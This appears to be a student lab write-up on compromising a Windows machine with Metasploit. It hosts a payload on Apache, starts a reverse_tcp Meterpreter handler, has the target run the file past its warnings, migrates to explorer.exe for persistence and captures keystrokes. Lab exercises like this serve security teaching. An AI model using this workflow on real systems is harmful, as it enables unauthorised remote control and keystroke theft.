# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

![bb](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/ffcd03a2-ac39-4ca8-a8a8-5380be19879e)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/95c87b35-1e6a-4932-aad1-590cb70b7b47)

Start apache server sudo systemctl apache2 start and Check the status of apache2

![kk](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/59ad7278-e928-4149-868c-2f3a2517e7c9)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set 
PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![ss](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/8c1b5af3-b56b-4c28-87d7-7efc12fda73c)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![uu](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/045f9e75-82e4-4b84-87f8-4a4eae8a3835)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![hh](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/e1703da8-a7a3-4fdd-ab16-1bd0dba1cb27)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![yy](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/01988ec5-d4d0-4a05-940e-7926d90a9f53)

keyscan_dump Shows the keystrokes captured so far

![jj](https://github.com/Sharmilasha/Compromising-windows-using-Metasploit/assets/94506182/f17b5851-101c-454f-804e-3c4c9db897d2)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
